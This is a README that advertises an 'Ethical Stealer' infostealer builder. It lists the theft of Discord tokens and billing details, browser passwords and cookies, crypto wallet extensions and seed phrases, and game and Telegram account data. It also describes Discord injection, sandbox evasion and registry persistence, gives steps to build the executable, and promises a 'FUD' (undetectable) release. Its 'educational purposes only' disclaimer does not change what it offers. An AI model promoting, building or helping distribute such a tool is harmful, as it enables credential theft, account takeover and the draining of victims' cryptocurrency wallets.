<h1 align="center">
💎 Ethical Stealer 💎 
</h1>
<h2 align="center">
🌟 Star this repo for a FUD release 🌟 
</h2>
<p align="center"> 
  <kbd>
<img src="https://media.discordapp.net/attachments/1135198740022562929/1135486038618427473/image.png" width="700"></img>
  </kbd>
</p>
<p align="center">

</p>
 
<p align="center">
  Telegram: <strong>@P3rsist3nt</strong>
  <br>

</p>
<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">

## Features

-   Discord information
    -   Nitro
    -   Badges
    -   Billing
    -   Email
    -   Phone
    -   HQ Friends
-   Browser data
    -   Cookies
    -   Passwords
    -   Chrome, Edge, Brave, Opera GX, and many more... 
-   Crypto data
    -   Extensions (MetaMask, Phantom, Trust Wallet, Coinbase Wallet, Binance Wallet)
    -   Softwares (Exodus Wallet, Atomic Wallet)
    -   Seedphrases
-   Application data
    -   Steam
    -   Riot Games
    -   Telegram
-   Discord injection
    -   Send token, password, and email on login, credit card/paypal added, nitro bought or when password/mail is changed
-   System information
    -   User
    -   System
    -   Disk
    -   Network
-   Anti-debug

    -   Check if being run in a VirusTotal sandbox

-   Startup persistence
    -   Place stub in appdata
    -   Add to startup registry

## Install

### Prerequisites

-   Windows 10/11
-   [Python](https://www.python.org/downloads/release/python-3109/)
-   [Git](https://git-scm.com/download/win)

### Setup

1. [Download source code zip](https://github.com/WiredZXZ/Ethical-Stealer/archive/refs/tags/ethical.zip)
2. Extract zip
3. First install reqiured packages by double clicking `install.bat` file
4. Run the builder by double clicking the `builder.bat` file
5. Follow instructions in builder and your exe will be found in the `dist` folder under the name `main.exe`

<div align="center">
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/img4.png"></img>
    <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="75%">    
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/img1.png"></img>
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/img2.png"></img>
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/img3.png"></img>
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/img5.png"></img>
</div>

## Disclaimer:

This tool is for educational purposes only. It is coded for you to see how your files are simply stolen and how to take action. Do not use for illegal purposes. We are never responsible for illegal use. <bold>Educational purpose only!</bold>

## License:
By downloading this, you agree to the Commons Clause license and that you're not allowed to sell this repository or any code from this repository. For more info see https://commonsclause.com/.

<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
